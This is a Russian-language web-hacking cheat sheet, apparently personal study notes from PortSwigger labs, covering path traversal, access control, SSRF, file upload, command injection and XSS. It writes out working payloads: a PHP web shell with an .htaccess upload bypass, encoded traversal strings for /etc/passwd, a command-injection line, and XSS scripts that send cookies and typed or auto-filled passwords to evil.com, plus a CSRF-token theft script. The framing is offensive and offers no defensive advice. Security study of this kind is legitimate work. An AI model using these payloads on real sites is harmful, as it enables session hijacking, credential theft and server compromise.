База веб pwn:

# Path traversal :

	Это обход директорий с целью доступа к произвольным файлам.
	К этому относится как и непосредственное чтение данных с сервера, 
	так и разведка, что в принципе есть на сервере.
	
	Все данные на сервере, если это Apache (Debian/Ubuntu), хранятся по пути : /var/www/html
	
	Самый примитивный обход директорий, это просто добавление к текущему пути нового "слова"
	
	https://vuln-site.com/user/secret	<== Попытка посмотреть что находится в /user/secret
	То есть на сервере это буквально попытка получить доступ к /var/www/html/user/secret
	
	Можно попытаться модифицировать путь к картинке :
	
	<img href="path/to/img"> --> <img href="../../../etc/passwd"> 
	
	Или же явно поменять аргумент для .php скрипта :
	
	<a href="/Data/GETfile?id=f2ef8e0e-3ead-4032-89c9-42468cd4f07d"> --> <a href="/Data/GETfile?id=../../../../etc/passwd">
	
# Access Control :

	Контроль доступа подразумевает получить права доступа другого пользователя. Его разделяют на 2 вида :
	
	Вертикальный контроль доступа - эскалация привелегий администратора :
	
	Попробовать получить интерфейс админа через простое добавление /admin к пути
	Есть вероятность что путь к интерфейсу может быть не просто /admin, но он может находиться в списке редиректов\сабдиров
	/robots.txt, он есть много где
	
	Горизонтальный контроль доступа :
	
	Может быть так, что при аутентификации пользовательский id видно прямо по url пути, например :
	https://vuln-site.com/user/21
	
	Поменяв 21 на другое число мы можем получить интерфейс другого пользователя. 
	Часто этот идентификатор может быть хэшем MD5 или чем-то подобном, однако можно отыскать этот идентификатор
	например, посетив профиль целевого аккаунта. Вероятнее всего в адресной строке будет что то типа 
	
	https://vuln-site/UserInfo?id=1111-aaaa-2222-bbbb
	
# Authentication :

	Аутентификация подразумевает, подтверждение личности с целью входа аккаунт.
	
	Большиство пользователей пользуются простыми логинами\паролями, которые поддаются атаке по словарю.
	В целом можно провести атаку по словарю через Intruder'a в BurpSuite
	
	Некоторые платформы с двухэтапной аутентификацией после правильного ввода пароля уже пускают в профиль.
	Есть вариант просто перейти на домашнюю страницу после запроса подтверждения.
	
# Server-side request forgery (SSRF) :

	Запросы на стороне сервера это когда серверу нужно обратиться к внутреннему API за информацией или чем то еще
	Как правило, это заведомо доверенные запросы, которые внутренние сервисы обрабатывают без валидаций и тд
	Можно подменить путь к API и вместо обращения к сервису напрямую получить интерфейс администратора.
	Не исключено что этот интерфейс находится на локальном хосте. Он может быть во внутренней сети, на другой машине,
	Однако мы все равно сможем достучаться до админки через перебор хостов 192.168.1.0/24,
	ну а если он все таки на текущей машине, то через localhost или 127.0.0.1 
	Такие запросы можно увидеть в request-пакетах
	
# File upload vulnerabilities :
	
	Если сервер рассчитал на загрузку файлов из вне, то мы можем это эксплуатировать если защита примитивна
	Чаще всего это используется для получения веб-шелла через .php скрипт
	Концепция в том, чтобы сначала подгрузить скрипт на сервер, а затем выполнить его.
	Если валидация в принципе отсутствует то простой скрипт : 
	
	<?php echo system($_GET['cmd']); ?>

	Позволит получить RCE примитив. Через :
	
	https://vuln-site/data/webshell.php?cmd="echo /etc/passwd"
	
	Но лучше пропустить payload через url кодировку прежде чем прокидывать аргумент
	
	Если же примитивная проверка все же присутствует на Content-Type или расширение, то вот как это обходится :
	
	Через BurpSuite можно подменить Content-Type с application/x-httpd-php на image/jpeg или png
	А так же первым делом подгрузить .htaccess с содержимым : AddType application/x-httpd-php .jpeg
	(На Apache это обычно работает, заставляя сервер .jpeg файлы скармливать .php интерпретатору)
	После чего загрузить webshell.php.jpeg
	
# OS command injection :

	Иногда разработчики полагаются на интерпретатор командной строки вместо ручного прописывания скриптов,
	что можно попытаться эксплуатировать.
	Это значит, что в содержимом request'а, POST запроса, как правило, поля пропускаются через интепретатор 
	командной строки, вызывая, непосредственно, скрипт или бинарь, ожидающий аргументы командной строки.
	Например :
	
	get_data_by_name.py "dolorez haze", где dolorez haze это какой нибудь инпут. В целом, нам ничего не мешает :
	get_data_by_name.py "dolorez haze" & cat /etc/passwd
	
	Вообще, расстановка кавычек зависит от "характера" ввода и тп, но это можно обходить через доп. кавычки + коммент #

## Углубленный уровень :

### Path Traversal :
	
	1. Absolute pathing : 
	
		Помимо того, что мы обсудили в начале, путь к данным может быть интерпретирован абсолютно
		Это значит, что нам не обязательно делать относительный поиск через ../
		Но на практике такое крайне редко
		
	2. Web-server stripping bypass :
	
		Часто можно встретить, что веб серверы предварительно обрабатывают путь перед его передачей
		приложению и при виде специфичных символов по типу ../ он вырезает их. 
		Вот несколько путей обхода :
		
			....//....//....//etc/passwd
		
		Парсер увидит комбинацию ../ => вырежет ее => останется :
		
			../../../etc/passwd
			
		Отлично. А что если парсер чуть умнее и обрабатывает эту комбинация корректно?
		Тут может помочь URL-encode. Мы можем закодировать символы и, вероятно, обойти парсер :
		
			%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
			
		Здесь он вряд ли найдет комбинацию ../, однако приложение корректно обрабатывает такой encode
		
		Если происходит двойное декодирование, то можно так же закодировать символ '%' :
		
			%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
			
		Декодируется то, что со знаком %. Значит, при декодировании мы получим строку : 
		
			%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
		
		Что при подстановке в приложение раскроется в корретный обход директории.
		
		Если и это не помогло, то можно попробовать еще 1 метод - UTF-8 кодировка
		Слеш можно закодировать как : %c0%af или %ef%bc%8f
		Однако такое кодирование может сработать либо на старых, либо на плохо спроектированных парсерах
		Последний вариант "специализируется" на винде, так как это альтернативная кодировка слеша, которая
		может быть интерпретирована как обычный '/'
		
		Запрос может выглядеть так : 
		
			GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2
			
		Важно отметить, что если в респонсе мы ожидаем текстовые данные, то нужно модифицировать заголовок Accept 
									(если он явно ожидает только картинку и т.п) :
		
			Accept: text/plain, text/html, */*
		
		В ответе получаем :
		
			HTTP/2 200 OK
			Content-Type: image/jpeg
			X-Frame-Options: SAMEORIGIN
			Content-Length: 2316

			root:x:0:0:root:/root:/bin/bash
			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
			bin:x:2:2:bin:/bin:/usr/sbin/nologin
			sys:x:3:3:sys:/dev:/usr/sbin/nologin
			sync:x:4:65534:sync:/bin:/bin/sync
			...
			
	3. Obstacles to path traversal
	
		Иногда на веб сервер запрос содержащий путь к файлу содержит абсолютный путь + другую директорию после /var/www/
		Например /var/www/images
		
		и GET запрос на картинку выглядит так :
		
			GET /image?filename=/var/www/images/44.jpg HTTP/2
			
		Конечно, можно попробовать воспользоваться абсолютным путем /etc/passwd и сразу его вставить
		Но сервер может валидировать запрос таким образом, что такой подход не выгорет
		Он может считать слеши, проверять наличие 3х первых директорий и т.п.
		Лучше воспользоваться стандартным подходом и воспользоваться ../ (методы мы рассмотрели выше)
		
		Финальный запрос : 
		
			GET /image?filename=/var/www/images/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd HTTP/2
			
		Иногда приложение ожидает обязательное расширение файла, к примеру .png
		Это можно обойти через нуль терминатор %00.
		
			GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00.jpg HTTP/2
			
		В итоге будет обработано имя файла до нуля терминатора и мы получим содержимое /etc/passwd

	4. Пара слов про path traversal :
	
		Может быть так, что сервер по умолчанию отклоняет комбинации ../ в пути, не смотря на парсеры и т.п, возвращая 400
		Однако можно комбинировать подходы кодирования, например :
		
		%2e%2e%252f --> ..%2f - это не ../ и будет передано приложению и оно уже способно обработать %2f и выполнить запрос (либо вернуть 403)


## XSS (Cross-Site-Scripting)
	Общая концепция XSS атаки - внедрить JavaScript через поля ввода, которые криво или недостаточно хорошо валидируются.
	Это могут быть объекты-скрипты через тэг <script> или коллбэки на разные события на стороне клиента.

	Самый примитивный poc на xss - это вызвать alert(). Если скрипт срабатывает, значит сайт уязвим.
	Значит мы можем выполнить любой скрипт на js, который будет находиться в этом поле ввода.
		
	В связи с CORS политикой в браузерах, если у нас сложная цепочка атаки, нужно использовать в ответе C2 (evil.com) специальные заголовки :
				
		Access-Contol-Allow-Origin: https://victim.com (или просто звездочку '*')
				
	Это позволит скрипту правильно обрабатывать респонс от С2 внутри скрипта для нескольких действий в рамках одной атаки
	
	
	1. Типы XSS атак :
	
		1. Reflected XSS :
		
			Атака, при которой полезная нагрузка нигде не сохраняется, а живет в рамках запроса жертвы :
			
				https://victim.com/search.php?q=<script>alert(document.cookie)</script>
			
			Если .php скрипт просто вставляет 'q' в html документ без должной обработки,
			То при переходе по ссылке у жертвы выполнится скрипт выше
			
		2. Stored XSS :
		
			Атака, при которой полезная нагрузка сохраняется на сервере и выполняется каждый раз при заходе на страницу
			Это могут быть комментарии, никнеймы в играх и т.д.
			
				<script>alert('hello we')</script>
				
		3. DOM-based XSS :
		
			Атака, при которой сервер вообще не участвует в обработке запроса. Уязвимость на клиенте.
			
				<script>
				    var name = location.hash.substring(1);
				    document.getElementById('welcome').innerHTML = 'Привет, ' + name;
				</script>

				<div id="welcome"></div>
				
			Если отправить следующий запрос :
			
				https://victim.com/#<img src=x onerror=alert(document.cookie)>
				
			То в div превратится в :
			
				div id="welcome"><img src=x onerror=alert(document.cookie)></div>
				

	2. Векторы XSS атак & пейлоады :
	
		Все векторы и пейлоады, описанные ниже, работают при любом типе XSS (Reflected, Stored, DOM-based). 
		Разница только в том, как мы доставляем этот скрипт жертве: через ссылку, через комментарий или через изменение URL-хэша.
		
			1. Steal cookie :
			
				Основная концепция этой техники - отправить сессионные куки (или другие токены согласно которым идет контроль сессии) на сервер
				Чтобы с полученными куками собрать вручную пакет для угона сессии. Это можно сделать если куки доступны из document 
				(Это значит что у них нет аттрибута HttpOnly)
				
				Пример такого скрипта :
				
					<script>
						fetch('https://evil.com/stealCookies?cookie=' + encodeURIComponent(document.cookie));
					</script>
					
				Берет куки из document, кодирует их согласно URL-encode и делает запрос на подконтольный нам сервер.
				Из логов сервера можно легко вытащить куки юзеров и через burp поменять хидер Cookie. 
				Либо через requests на питоне собрать пакет самому.
				
			2. Steal auto-filled credentials :
			
				Суть данной техники - угнать учетные данные через слушание полей ввода для пароля, которые сами заполняются браузером
				Например, когда мы заходим на какой то сайт, браузер сам подставляет данные учетки, на которой мы недавно сидели (если автозаполнение есть)
				Наша задача - просто перехватывать обновления полей ввода. Это можно сделать разными способами :
				
					<script>
						document.querySelector('input[id="login"]').addEventListener('input', function(field) {
							fetch(`https://evil.com/stealPasswd?pwd=${encodeURIComponent(field.target.value)}`);
						});
						
						document.querySelector('input[type="password"]').addEventListener('input', function(field) {
							fetch(`https://evil.com/stealPasswd?pwd=${encodeURIComponent(field.target.value)}`);
						});
					</script>
				
				Просто вешаем коллбек на событие input. Кстати, такой способ сработает даже если пользователь вводит данные вручную.
				Скрипт по букве будет отправлять логин + пароль на сервер. Палевно, но работает. Вряд ли юзер полезет в DevTools проверять активность.
				
					<script>
						setTimeout(function() {
						    const login = document.getElementById('login')?.value;
						    const pwd = document.querySelector('input[type="password"]')?.value;
						    
						    if (login) {
						    	fetch('https://evil.com/steal?p=' + encodeURIComponent(login));
						    }
						    
						    if (pwd) {
							fetch('https://evil.com/steal?p=' + encodeURIComponent(pwd));
						    }
						}, 2000);
					</script>
			
				Тут мы ждем пару секунд, чтобы пропарсить оба поля и высылаем.
				Но для этого нужно внедрить скрипт именно на страницу ввода пароля. Что если она не уязвима к XSS?
				Если сайт уязвим к XSS, то нам ничего не мешает самим создать форму нужного вида, чтобы браузер распознал ее как знакомую и подставил данные :
				
					<input name=username id=username>
					<input type=password name=password onchange="if (this.value.length) fetch('https://evil.com',{
						method:'POST',
						mode: 'no-cors',
						body:username.value+':'+this.value
					});">
					
				То есть мы внедряем не просто скрипт, а целую форму, которая выглядит "как для ввода учетных данных", вещаем коллбек на ее заполнение,
				Который отправляет данные на наш сервер.
				
			3. CSRF bypass :
			
				CSRF - система, которая делает дополнительную проверку на наличие специального токена в формах для отправки.
				Это сделано для того, что бы, например, такой сценарий не прокатил :
				
					1. Хакер на сайте evil.com оставляет скрипт на клиенте:
						<script>fetch('https://bank.com/transfer?id=1337&amount=1000000')</script>
					2. Жертва заходит и отправляет запрос выше на сайт банка, сама того не понимая
					3. С жертвы списывается 1000000
				
				CSRF в каждое поле ввода вставляет специальный csrf токен, который проверяется при отправке формы обратно
				Он может прокидываться через заголовок или тело запроса. Если они не совпали - запрос отклоняется. 
				Как правило этот токен одинаковый во всех формах в рамках одной сессии (если не юзается кастомная надстройка над CSRF)
				И угнав этот токен, можно выполнять разные действия от лица юзера. Рассмотрим пример скрипта для смены почты :
				
					<script>
						document.addEventListener('DOMContentLoaded', function() {
							const  crsfToken = document.querySelector('input[name="csrf"]')?.value;
							
							if (!crsfToken) {
								console.error('[-] Cannot read crsf');
								return;
							}
							
							console.log(`[+] Token : ${crsfToken}`);
							
							const newEmail = 'sayhi@pwn.soc';
							
							fetch('/my-account/change-email', {
								method: 'POST',
								headers: {
									'Content-Type': 'application/x-www-form-urlencoded'
								},
								body: 'email=' + encodeURIComponent(newEmail) + '&csrf=' + encodeURIComponent(crsfToken)
							}).then(response => {
								if (!response.ok) {
									console.error(`[-] Fail with code : ${response.status}`);
									return; 
								}
								
								console.log(`[+] Successfully changed to ${newEmail}`);
							}).catch(err => console.log(err));
						});
					</script>
					
				Стоит отметить, что скрипт для "прода", разумеется не логирует свои действия в консоль DevTools.
				Логи идут или на сервер, или вообще никуда. Это скрипт с одной из лаб с портсвиггера.
				
				Здесь мы читаем сам токен из элемента input, где name=csrf. Затем отсылаем POST запрос содержащий форму для смены почты, 
				Где в теле запроса содержится токен. Место, через которое он передается, можно посмотреть через burp.
				Сам запрос выглядит так :
				
					POST /my-account/change-email HTTP/2
					Host: 0a1400b70442adf7809fc68c00570039.web-security-academy.net
					Cookie: session=wwI62nsXF9IWPxZTXyUY3in9E5bSdISt
					Content-Length: 59
					Sec-Ch-Ua-Platform: "Linux"
					Accept-Language: en-US,en;q=0.9
					Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
					Content-Type: text/plain;charset=UTF-8
					Sec-Ch-Ua-Mobile: ?0
					User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
					Accept: */*
					Origin: https://0a1400b70442adf7809fc68c00570039.web-security-academy.net
					Sec-Fetch-Site: same-origin
					Sec-Fetch-Mode: cors
					Sec-Fetch-Dest: empty
					Referer: https://0a1400b70442adf7809fc68c00570039.web-security-academy.net/post?postId=1
					Accept-Encoding: gzip, deflate, br
					Priority: u=1, i

					email=sayhi%40pwn.org&csrf=LsBxuGn1MHYKMFjWsAJTH26o4BdohLT1
